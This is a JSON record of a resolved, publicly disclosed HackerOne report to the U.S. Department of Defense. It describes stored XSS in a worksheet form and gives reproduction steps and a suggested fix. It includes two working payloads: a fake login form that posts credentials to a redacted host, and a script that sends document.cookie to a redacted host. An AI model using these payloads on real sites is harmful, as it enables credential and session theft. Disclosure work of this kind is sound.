{
  "id": 847176,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDcxNzY=",
  "url": "https://hackerone.com/reports/847176",
  "title": "Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-04-11T08:39:44.046Z",
  "submitted_at": "2020-04-11T08:39:44.046Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "un4gi",
    "url": "/un4gi",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/2dt343jbqmyhwmtbf346z44hzlbn/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%22tak.jpg%22%3B%20filename%2A%3DUTF-8%27%27tak.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRPZENPKD%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T071414Z&X-Amz-Expires=3159&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAVHQbwsDoPkABWT5%2B%2FcxKj9dlPUCiAK7T%2BFFCXdxLrPAiBX2lSHjESlSy8QsUlA7vXdLSn4ea4Xiiw2UrbmZz%2Blwyq7BQj7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMDCypXEsZEkr5ireXKo8FZYoY4LAjDpPPUtd1NsbqDrfHEKbol%2Fl0zbzUkHb%2FDMyufObmydLXAVfTWyTq8M83futwK1Yua1CHEl3flNsyoGlBRT7783Yno%2BSIhflCnhdl34SfYe3WSz3KMlR6U6rObGpEEedLsrp2lH30QPw%2BCCr0rMC2GFUhTSW8t1aSZgiThB4a7g4EkofATsLrkgjKf%2F%2FPbVuhiONHZD7V8A4dsRicBCm5QCAJ8gdc9%2Fa%2FchZNAQalNGvbYjZZ4OZClucbktKQgwOkNtsAZ%2F3fpin4oioVvhBVK2QTGYKzS9Vw4AgUKbRO2C4PTfySYDWuyUTG9zrGCEYEq6MtYjVjMciE9aPiEW4OCpALv9c%2Fnhwo6XyDEUc5Y4J7kpkmgxiJm%2FnKnhBX6L%2FhwQimgfYkpHdiPVQDdH6CJRToS884u7zt6Oitvu9ZxHRv%2BNw7UWz8C%2F4zpUT%2F1YrDnDMW8LmGWj5lTMuNW%2F%2FXeN9PV64LEdK1XnN26vJLY9tPRAkAEphIEa2Mp9mhZZ1Z7MefD7V4WTQZUazBcZfZdFjfOMrh0ibOMgoo8CCiL1Cm7uQQ1CzZt%2BtZzM6OlBy%2BgYE8qtUpXtotvnXnqU2Unr329EMF1ngMiPpfnJK2zIC6KlnKvp5D1PoUUJ5BP1ka873JsX69XDa2ARmnfKK2hUOe6FyV4OPe7zIMQgyJiAbEHWzMS3mq4pEiKJvvdg3xhF6AkjB92yRN1CNtLBnr1601Z%2F11uh3k97BGpzb5otiRC9tOjelGgcp81%2B5cUuuo5muMij9PbHD2r02l0F7WTXYCw6PyFC15Om5QvWq74M%2BgyuElq61LfIE5IkUt44aIWcdWTvBBa%2FpxFjyIiYpZJqIus6ylSdxepDCFur3GBjqyAazMVovu%2FR7HlzcY6BZH9cet9jDRlt4O%2Fc7u%2BrXfJy0AyilF%2B4S%2B1%2FNq3RFpJPt7gS%2FWDMzJBRmOs0q8SVlHxvhV3uzMsWZYHd5YH9PmXpJ7RM%2FT71zoNIxnESl69wmjk00scT45yz6xd%2FW6SzJWdAn5FKDKPGkQzhsO%2Bg5iALG%2F6Ghlp9VB%2Fw5RX5GDfsXlaq2IFEEcViasX2xZl9TGDZ8G2xXZXFJXAZ8px7d1T5xkzbU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6fed1c2107950b3929af888e3ff994abf3293de3f6e77993a444faabe449f574"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-02-10T21:07:10.472Z",
  "bug_reporter_agreed_on_going_public_at": "2021-02-05T21:06:52.296Z",
  "team_member_agreed_on_going_public_at": "2021-02-10T21:07:10.348Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\nA user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.\n\n## Impact\nThe attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.\n\n## Step-by-step Reproduction Instructions\n\n1. Browse to https://█████\n████████\n2. Click `█████████`. Once on the ██████ page, click `███ and ████████`\n██████████\n3. Click `Continue`.\n██████\n4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.\n███\n5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.\n█████████\n7. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.\n█████████\n8. Click `██████`, or return to the `███████` page and put in your info in the `█████` area to modify the worksheet. The XSS will fire in both locations.\n█████████\n9. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:\n\n```\n<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type=\"username\" name=\"username\"></br>Password:<br><input type=\"password\" name=\"password\"></br><br><input type=\"submit\" value=\"Logon\"></br>\n```\n█████████\n███\n\nAn attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:\n`<script>window.location=\"http://███/?cookie=\" + document.cookie</script>`\n██████\n\n## Suggested Mitigation/Remediation Actions\nSanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.\n\n## Impact\n\nThe attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 8,
  "voters": [
    "shreyaschavhan",
    "un4gi",
    "term1nal",
    "dastan_9408",
    "pr0f0x01",
    "caiosev",
    "mattharkonnen",
    "cyber112"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
